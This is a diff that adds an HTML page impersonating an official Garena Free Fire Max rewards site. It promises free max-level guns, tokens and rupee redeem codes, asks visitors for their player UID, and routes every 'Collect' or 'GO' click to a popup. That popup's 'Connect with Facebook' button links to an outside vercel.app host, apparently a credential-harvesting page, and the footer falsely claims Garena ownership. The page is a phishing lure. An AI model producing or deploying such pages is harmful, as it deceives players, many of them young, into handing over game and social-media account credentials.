@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Free Fire Max Rewards</title>
+  <!-- Google Font: Poppins -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css" />
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+  />
+  <style>
+    /* Popup overlay - (Keep your existing popup styles here) */
+    .popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.85); /* Darker overlay */
+      display: none; /* Initially hidden */
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      padding: 1rem;
+      opacity: 0; /* For fade animation */
+      transition: opacity 0.4s ease-in-out;
+    }
+    .popup-overlay.active { /* Class to show popup */
+        display: flex;
+        opacity: 1;
+    }
+
+    .popup-content {
+      background: linear-gradient(145deg, #232323, #1a1a1a); /* Dark gradient */
+      padding: 2rem;
+      border-radius: 12px;
+      max-width: 400px; /* Slightly wider */
+      width: 90%;
+      text-align: center;
+      color: #f0f0f0;
+      box-shadow: 0 5px 25px rgba(24, 119, 242, 0.3), 0 0 30px rgba(255, 215, 0, 0.2); /* Dual shadow */
+      position: relative;
+      font-family: 'Poppins', sans-serif;
+      border: 1px solid #f0c14b; /* Gold border */
+      transform: scale(0.95); /* For scale animation */
+      opacity: 0; /* For fade animation */
+      transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.3s ease-in-out;
+    }
+    .popup-overlay.active .popup-content {
+        transform: scale(1);
+        opacity: 1;
+    }
+
+    .close-popup {
+      position: absolute;
+      top: 12px;
+      right: 18px;
+      font-size: 30px;
+      font-weight: bold;
+      color: #aaa;
+      cursor: pointer;
+      transition: color 0.3s ease, transform 0.3s ease;
+    }
+    .close-popup:hover {
+      color: #f0c14b; /* Gold hover */
+      transform: rotate(90deg);
+    }
+
+    .popup-logo {
+      width: 130px;
+      margin-bottom: 1.2rem;
+      filter: drop-shadow(0 0 8px #fbc531aa);
+    }
+
+    .popup-message {
+      font-size: 1.15rem; /* Slightly larger */
+      margin-bottom: 1.8rem;
+      color: #e0e0e0;
+      line-height: 1.5;
+    }
+
+    .connect-btn {
+      display: inline-block;
+      background-color: #1877f2;
+      color: white;
+      font-weight: 600;
+      padding: 0.7rem 1.8rem;
+      border-radius: 8px;
+      text-decoration: none;
+      font-size: 1.05rem; /* Slightly larger */
+      box-shadow: 0 4px 12px rgba(24, 119, 242, 0.5);
+      transition: background-color 0.3s ease, box-shadow 0.3s ease, transform 0.2s ease;
+      cursor: pointer;
+    }
+    .connect-btn:hover,
+    .connect-btn:focus {
+      background-color: #145dbf;
+      box-shadow: 0 6px 18px rgba(20, 93, 191, 0.7);
+      transform: translateY(-2px);
+      outline: none;
+    }
+
+    .popup-footer {
+      margin-top: 2rem;
+      font-size: 0.8rem;
+      color: #888;
+    }
+
+    /* Styling for MAX LEVEL / Token Count for consistency */
+    .reward-item .token-count {
+        font-size: 0.8rem;
+        color: #ffd700; /* Gold color for count */
+        font-weight: bold;
+        background-color: rgba(0,0,0,0.6);
+        padding: 3px 8px;
+        border-radius: 5px;
+        margin-top: 8px; /* Add some space above it */
+        display: inline-block; /* To allow padding and centering if needed */
+        border: 1px solid #f0c14b33;
+    }
+    .evo-image-container .token-count { /* Specifically for tokens inside evo container */
+        position: absolute;
+        bottom: 5px;
+        left: 50%;
+        transform: translateX(-50%);
+        z-index: 2;
+    }
+
+
+  </style>
+</head>
+<body class="preload"> <!-- Added preload class -->
+  <header>
+    <div class="navbar">
+      <img
+        src="ffimages/garena_logo.b28b2b6.png"
+        alt="Free Fire Max Logo"
+        class="logo"
+      />
+      <div class="social-icons">
+        <a href="#"><i class="fab fa-facebook-f"></i></a>
+        <a href="#"><i class="fab fa-instagram"></i></a>
+        <a href="#"><i class="fab fa-youtube"></i></a>
+      </div>
+      <div class="nav-actions">
+        <a href="#"><i class="fas fa-shopping-cart"></i></a>
+        <a href="#" class="menu-toggle"><i class="fas fa-bars"></i></a>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <section class="hero-section">
+      <div class="hero-background">
+      </div>
+      <div class="hero-content">
+        <div class="uid-form">
+          <input type="text" placeholder="Enter UID" id="uid-input" />
+          <button type="button" id="go-btn">GO</button>
+        </div>
+        <div class="claim-banner">
+          CLAIM AND GET YOUR EXCLUSIVE REWARD NOW
+        </div>
+      </div>
+    </section>
+
+    <section class="rewards-section">
+      <div class="rewards-grid">
+        <!-- Items as per your HTML structure -->
+        <!-- Row 1: Guns -->
+        <div class="reward-item">
+          <div class="item-header">CROSSBOW <span class="item-subtitle">GUN</span></div>
+          <img src="ffimages/crosbow.png" alt="Crossbow" />
+          <span class="token-count">MAX LEVEL</span>
+          <a href="#" class="collect-button">Collect</a>
+        </div>
+        <div class="reward-item">
+          <div class="item-header">TROPICAL PARAFAL <span class="item-subtitle"> GUN</span></div>
+          <img src="ffimages/tropicalparafal.jpg" alt="Tropical Parafal" />
+          <span class="token-count">MAX LEVEL</span>
+          <a href="#" class="collect-button">Collect</a>
+        </div>
+        <div class="reward-item">
+          <div class="item-header">PAPER UMP <span class="item-subtitle">GUN</span></div>
+          <img src="ffimages/yelloump.png" alt="Paper UMP" />
+          <span class="token-count">MAX LEVEL</span>
+          <a href="#" class="collect-button">Collect</a>
+        </div>
+
+        <!-- Row 2: More Guns/Items -->
+        <div class="reward-item">
+          <div class="item-header">SCAR MEGALADON<span class="item-subtitle">GUN</span></div>
+          <img src="ffimages/scarmegaladon.jpeg" alt="Scar MEGALADON" />
+          <span class="token-count">MAX LEVEL</span>
+          <a href="#" class="collect-button">Collect</a>
+        </div>
+        <div class="reward-item">
+          <div class="item-header">POKER MP40 <span class="item-subtitle">GUN</span></div>
+          <img src="ffimages/yellow poker.jpg" alt="Poker MP40" />
+          <span class="token-count">MAX LEVEL</span>
+          <a href="#" class="collect-button">Collect</a>
+        </div>
+        <div class="reward-item">
+          <div class="item-header">PROING <span class="item-subtitle">PET</span></div>
+          <img src="ffimages/poring_pet.webp" alt="Proing Pet" />
+          <a href="#" class="collect-button">Collect</a>
+        </div>
+
+        <!-- Row 3: EVO Guns (using evo-token class for consistency in structure if desired) -->
+        <div class="reward-item evo-token"> <!-- Keep evo-token for specific styles if any, or remove if not needed -->
+          <div class="item-header">EVO M1887 <span class="item-subtitle">GUN</span></div>
+          <div class="evo-image-container"> <!-- Use this container to better control image and "MAX LEVEL" text -->
+            <img src="ffimages/m1887blue.jpg" alt="M1887 Blue" />
+            <span class="token-count">MAX LEVEL</span>
+          </div>
+          <a href="#" class="collect-button">Collect</a>
+        </div>
+        <div class="reward-item evo-token">
+          <div class="item-header">EVO AK47 <span class="item-subtitle">GUN</span></div>
+          <div class="evo-image-container">
+            <img src="ffimages/AK47.jpg" alt="EVO AK47" />
+            <span class="token-count">MAX LEVEL</span>
+          </div>
+          <a href="#" class="collect-button">Collect</a>
+        </div>
+        <div class="reward-item evo-token">
+          <div class="item-header">EVO M1887 <span class="item-subtitle">GUN</span></div>
+          <div class="evo-image-container">
+            <img src="ffimages/m1887.jpg" alt="M1887" />
+            <span class="token-count">MAX LEVEL</span>
+          </div>
+          <a href="#" class="collect-button">Collect</a>
+        </div>
+
+        <!-- Row 4: More EVO Guns/Tokens -->
+        <div class="reward-item evo-token">
+          <div class="item-header">EVO MP40 <span class="item-subtitle">COBRA</span></div>
+          <div class="evo-image-container">
+            <img src="ffimages/redpoker.jpg" alt="EVO MP40 Cobra" />
+            <span class="token-count">MAX LEVEL</span>
+          </div>
+          <a href="#" class="collect-button">Collect</a>
+        </div>
+        <div class="reward-item evo-token">
+          <div class="item-header">EVO SCAR <span class="item-subtitle">TOKEN</span></div>
+          <div class="evo-image-container">
+            <img src="ffimages/EVOSTOKEN.png" alt="EVO SCAR Token" />
+            <span class="token-count">X 2064</span>
+          </div>
+          <a href="#" class="collect-button">Collect</a>
+        </div>
+        <div class="reward-item evo-token">
+          <div class="item-header">EVO UNIVERSAL <span class="item-subtitle">TOKEN</span></div>
+          <div class="evo-image-container">
+            <img src="ffimages/UNIVERSAL.png" alt="EVO UNIVERSAL Token" />
+            <span class="token-count">X 2064</span>
+          </div>
+          <a href="#" class="collect-button">Collect</a>
+        </div>
+
+        <!-- Row 5: Redeem Codes -->
+        <div class="reward-item redeem-code-item">
+          <div class="item-header">REDEEM CODE <span class="item-subtitle">100 RUPEES</span></div>
+          <img src="ffimages/google_play_recharge_code.png" alt="Redeem Code 100 Rupees"/>
+          <a href="#" class="collect-button">Redeem</a>
+        </div>
+        <div class="reward-item redeem-code-item">
+          <div class="item-header">REDEEM CODE <span class="item-subtitle">200 RUPEES</span></div>
+          <img src="ffimages/google_play_recharge_code.png" alt="Redeem Code 200 Rupees"/>
+          <a href="#" class="collect-button">Redeem</a>
+        </div>
+        <div class="reward-item redeem-code-item">
+          <div class="item-header">REDEEM CODE <span class="item-subtitle">500 RUPEES</span></div>
+          <img src="ffimages/google_play_recharge_code.png" alt="Redeem Code 500 Rupees"/>
+          <a href="#" class="collect-button">Redeem</a>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>@garena freefire official - All rights reserved</footer>
+
+  <!-- Popup for GO button -->
+  <div class="popup-overlay" id="go-popup">
+    <div class="popup-content">
+      <span class="close-popup" id="go-popup-close">×</span>
+      <img src="ffimages/garena_logo.b28b2b6.png" alt="Free Fire Max Logo" class="popup-logo"/>
+      <div class="popup-message">Please select any one of your favorite items to claim your reward.</div>
+      <a href="http://connect-your-freefire-account.vercel.app" target="_blank" class="connect-btn">Connect with Facebook</a>
+      <div class="popup-footer">@Garena Free Fire Official - All rights reserved</div>
+    </div>
+  </div>
+
+  <!-- Popup for Collect buttons -->
+  <div class="popup-overlay" id="collect-popup">
+    <div class="popup-content">
+      <span class="close-popup" id="collect-popup-close">×</span>
+      <img src="ffimages/garena_logo.b28b2b6.png" alt="Free Fire Max Logo" class="popup-logo"/>
+      <div class="popup-message">Thank you for collecting your reward! Connect your account to receive it.</div>
+      <a href="http://connect-your-freefire-account.vercel.app" target="_blank" class="connect-btn">Connect with Facebook</a>
+      <div class="popup-footer">@Garena Free Fire Official - All rights reserved</div>
+    </div>
+  </div>
+
+  <script>
+    window.addEventListener('load', () => {
+        document.body.classList.remove('preload');
+    });
+
+    const goBtn = document.getElementById("go-btn");
+    const goPopup = document.getElementById("go-popup");
+    const goClose = document.getElementById("go-popup-close");
+    const uidInput = document.getElementById("uid-input");
+
+    function openPopup(popupElement) {
+        popupElement.classList.add('active');
+        // Prevent background scroll
+        document.body.style.overflow = 'hidden';
+    }
+
+    function closePopup(popupElement) {
+        popupElement.classList.remove('active');
+        // Restore background scroll
+        document.body.style.overflow = '';
+    }
+
+    goBtn.addEventListener("click", () => {
+      if (uidInput.value.trim() === "") {
+        // Optional: Add some visual feedback if UID is empty
+        uidInput.style.borderColor = "red";
+        uidInput.placeholder = "Please enter your UID!";
+        setTimeout(() => {
+            uidInput.style.borderColor = "#555"; // Reset border color
+            uidInput.placeholder = "Enter UID";
+        }, 2000);
+        return;
+      }
+      openPopup(goPopup);
+    });
+    goClose.addEventListener("click", () => closePopup(goPopup));
+
+    const collectPopup = document.getElementById("collect-popup");
+    const collectClose = document.getElementById("collect-popup-close");
+
+    document.querySelectorAll("a.collect-button").forEach((btn) => {
+      btn.addEventListener("click", (e) => {
+        e.preventDefault(); // Prevent default link behavior
+        if (uidInput.value.trim() === "") {
+            // If UID is not entered, prompt for UID first or show an error
+            uidInput.focus();
+            uidInput.style.borderColor = "red";
+            uidInput.placeholder = "Enter UID before collecting!";
+            setTimeout(() => {
+                uidInput.style.borderColor = "#555";
+                uidInput.placeholder = "Enter UID";
+            }, 2500);
+            return; // Stop further execution
+        }
+        // Store which item was clicked (optional, for specific logic later)
+        // const itemName = btn.closest('.reward-item').querySelector('.item-header').textContent;
+        // console.log("Collecting:", itemName);
+        openPopup(collectPopup);
+      });
+    });
+    collectClose.addEventListener("click", () => closePopup(collectPopup));
+
+    // Close popups if user clicks on the overlay
+    window.addEventListener("click", (e) => {
+      if (e.target === goPopup) closePopup(goPopup);
+      if (e.target === collectPopup) closePopup(collectPopup);
+    });
+
+    // Close popups with Escape key
+    window.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') {
+            if (goPopup.classList.contains('active')) closePopup(goPopup);
+            if (collectPopup.classList.contains('active')) closePopup(collectPopup);
+        }
+    });
+  </script>
+</body>
+</html>
